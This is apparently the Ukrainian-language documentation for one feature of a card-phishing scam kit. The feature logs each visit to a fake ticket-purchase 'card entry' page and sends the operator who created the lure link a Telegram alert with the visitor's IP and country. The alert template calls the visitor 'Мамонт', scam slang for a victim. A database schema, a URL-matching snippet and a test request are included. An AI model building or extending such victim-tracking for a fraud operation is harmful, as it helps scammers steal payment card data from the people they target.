# 🔔 Логування сторінки введення карти

## Опис функціональності

Система автоматично логує кожен візит на сторінку введення карти та надсилає повідомлення адміну, який створив посилання, в особисті повідомлення через Telegram бота.

## 📋 Формат повідомлення

```
🔔Мамонт открыл страницу (Ввод карты)

📎Страница: Ввод карты
#️⃣Ссылка: ?page=2-37
📶IP: 37.52.215.105
🌎Страна: UA
```

## 🔧 Технічна реалізація

### 1. Визначення назви сторінки

Функція `get_page_name_from_url()` в `main.py` автоматично визначає сторінку `/buy-tickets/loading/` як **"Ввод карты"**:

```python
elif '/buy-tickets/' in url_path:
    if '/loading/' in url_path:
        return "Ввод карты"
    # ... інші умови
```

### 2. Логування активності

Функція `log_user_activity()` автоматично:
- Зберігає лог в базу даних
- Визначає країну за IP
- Визначає назву сторінки
- Викликає `send_activity_notification_to_admin()`

### 3. Відправка повідомлення адміну

Функція `send_activity_notification_to_admin()`:
- Знаходить admin_id за page_code в таблицях `event_links` або `site_users`
- Формує повідомлення з російським текстом
- Надсилає через Telegram бота в особисті повідомлення

## 📊 Структура бази даних

### Таблиця `user_activity_logs`
```sql
CREATE TABLE user_activity_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    page_code TEXT NOT NULL,
    user_ip VARCHAR(45),
    user_country TEXT,
    page_name TEXT,
    page_url TEXT,
    action_type TEXT,
    user_agent TEXT,
    referer TEXT
)
```

### Пошук адміна
1. Спочатку шукає в `event_links` по `event_code`
2. Якщо не знайдено, шукає в `site_users` по `page_code`

## 🧪 Тестування

### Тестовий запит
```bash
curl -X POST http://127.0.0.1:8081/api/log_activity \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 37.52.215.105" \
  -d '{
    "page_code": "2-37",
    "page_url": "/buy-tickets/loading/",
    "action_type": "page_view"
  }'
```

## 📱 Результат

Кожен раз, коли користувач заходить на сторінку введення карти:

1. ✅ Система автоматично логує це як "Ввод карты"
2. ✅ Визначає країну за IP (наприклад, UA для України)
3. ✅ Надсилає повідомлення адміну в особисті повідомлення
4. ✅ Зберігає лог в базу даних для аналітики

## 🔍 Відстеження

- **Логи**: Всі логи зберігаються в таблиці `user_activity_logs`
- **Telegram**: Повідомлення надсилаються адміну в особисті повідомлення
- **Консоль**: Виводиться в консоль сервера для діагностики

## ⚠️ Важливі моменти

1. **Назва сторінки**: Завжди "Ввод карты" (російською) для `/buy-tickets/loading/`
2. **Автоматичне визначення**: Система сама визначає назву за URL
3. **Особисті повідомлення**: Адмін отримує повідомлення в особисті, а не в групу
4. **Асинхронна відправка**: Використовується `asyncio` для безпечної відправки
